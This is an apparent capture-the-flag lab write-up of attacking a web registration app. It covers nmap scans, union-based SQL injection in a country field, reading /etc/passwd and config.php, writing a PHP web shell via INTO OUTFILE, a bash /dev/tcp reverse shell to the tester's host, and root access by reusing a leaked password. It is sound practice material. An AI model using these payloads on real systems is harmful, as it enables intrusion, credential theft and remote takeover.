## Testing

*Starting knowing there is SQLi somewhere. Picked to practice SQLi.*

Start: 2026-09-15, 11:35

IP:
```
10.129.58.61
```
----

ports

```
sudo nmap -p- -Pn -n -vv --min-rate=5000 10.129.58.61 -oG network/nmap_ports.txt
```

01

port 80 and 8080 - HTTP
port 22 - SSH
port 4566 - kwtc
ports 5000-5008 filtered

("The official assignment for this port is **kwtc**, short for **Kids Watch Time Control Service**. Public documentation is limited, and there is no widely used modern protocol suite built around it in the way you would expect with HTTP, SSH, or DNS. In real environments, **that usually means the listener is tied to a specific application**, an older management utility, or a custom service that adopted the registered number.")

service and version

```
sudo nmap -p22,80,4566,8080 -sCV 10.129.58.61 -oN network/nmap_service.txt
```

02

port 80 HTTP - Apache httpd 2.4.48 (Debian)
port 4566 - nginx - 403 forbidden
port 8080 - nginx - 502 bad gateway

Port 80 and 8080 seem to be different servers and different applications, port 4566 may be tied to 8080 web server since both result to be fingerprinted as nginx, maybe some kind of proxy or websocket?

HTTP port 80 - Web

Browsing: http://10.129.58.61/

03

Right away it reminds me of the last test on "Union". Similar website look, functionality and UHC brand. The functionality is to register, input a name and select a country.

Register a name and pick a country, redirected to `account.php`

04

Greeted by a message "`Welcome <user_input_name>`", and showing other player on same country

Opening BurpSuite

05

POST request, `username` and country `parameters`. Response 302 Found, redirect to `/account.php`. PHP version 7.4.23

Following the redirect

06

GET `/account.php`, response with Welcome message and username, then the already registered players on the selected country (Chile)

Trying different payloads, boolean/conditional, time, UNION, watching for reflection. Nothing seems to change behavior

Fuzzing

```
ffuf -u http://10.129.58.61/FUZZ.php -w /opt/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
```

07

`config.php`, `accountphp` and `index.php`

8080 is not accessible, trying more payloads even on the cookie parameter but nothing is making sense, some payloads sent return the name/payload used on tries from before. 

Now see an error

08

Ordering by 1 returns nothing. Ordering by 2 returns the error. 
(Default webroot `/var/www/html/)

```
' union select null,null-- -
```

This payload triggers the same message, 2 columns

The inectable parameter is `country`

Tried to read a file and can, weird that I dont need to specify 2 columns as it seems thats what the original query wants.

Injecting in `country` parameter:

```
' union select load_file("/etc/passwd")-- -
```

09

Here can fully confirm is MySQL

Reading the `config.php` file

```
' union select null,load_file("/var/www/html/config.php")-- -
```

The contents are not listed on the browser as is php code but interceptiong the response on BurpSuite can read it.

10

Username
```
uhc
```

Password
```
uhc-9qual-global-pw
```

Database schema name: `registration`

This is the credential for a database user `uhc`

Checking SSH access the credential is not valid or this account is denied for SSH.

Enumerating database

```
' union select null,table_name from information_schema.tables where table_schema='registration'-- -
```

table `registration`

```
' union select column_name from information_schema.columns where table_name='registration'-- -
```

12

Columns `username` and `userhash` 
(without null, just one column count, weird sometimes works with one sometimes with two)

```
' union select username,userhash from registration-- -
```

Not working

Using concat

CONCAT(`SUBJECT`, ' ', `YEAR`)

```
' union select concat(username," ",userhash) from registration-- -
```

13

This are all my entries, not sure what is it hashing. Anyways, no fun for me.

Enumerating any other database

```
' union select schema_name from information_schema.schemata-- -
```

14

Nothing interesting

Reading `account.php`

```
' union select null,load_file("/var/www/html/account.php")-- -
```

15

Can see the original query but not much.

Trying to write a malicious PHP file

```
' UNION SELECT "<?php system($_GET['c']); ?>",NULL INTO OUTFILE '/var/www/html/shell.php'-- -
```

Response is just the error saw earlier but its successfully uploaded

Browsing: http://10.129.58.61/shell.php?c=whoami

16

Reverse shell

Payload: bash -c 'bash -i &> /dev/tcp/10.10.14.204/9001 0>&1' 
URL encoded: bash+-c+'bash+-i+%26>+/dev/tcp/10.10.14.204/9001+0>%261'

17

Connected as `www-data` to target system `validation`

```
cat /home/htb/user.txt
```

18

user.txt: 4d5e6bad320020cb4dde72c77a4f53b9

---

Privilege escalation

Enumerating sudo privileges

```
sudo -l
```

19

No sudo

Enumerating SUID binaries

```
find / -perm -4000 2>/dev/null
```

20

After being stuck and thinking of possible ways, remmeber the earlier discovered credential for uhc on config.php and try it for root and it works, didnt expect this.

21

root.txt: 3c5c5008eb67acbbe48a1f224a3d7607

End: 2026-09-15, 13:50

---

#### Post testing
##### Time frame
Start: 2026-09-15, 11:35
End: 2026-09-15, 13:50

Total Time Testing: 2h 15min
##### Techniques
- SQLi union query with reflected data in response
- Reading files via SQLi (MySQL)
- Writting a malicious file (PHP) via SQLi (MySQL) 
##### Sources
- https://portlookup.com/port-4566/
- https://stackoverflow.com/questions/10346302/mysql-concatenate-two-columns

*Note: The test finished without any Hint or reference from walkthroughs but, as this machine was handpicked to pratice SQLi, started knowing there is SQLi somewhere, and thats a significant tip, so will mark the reference level as "Hint" and not "Solo".*
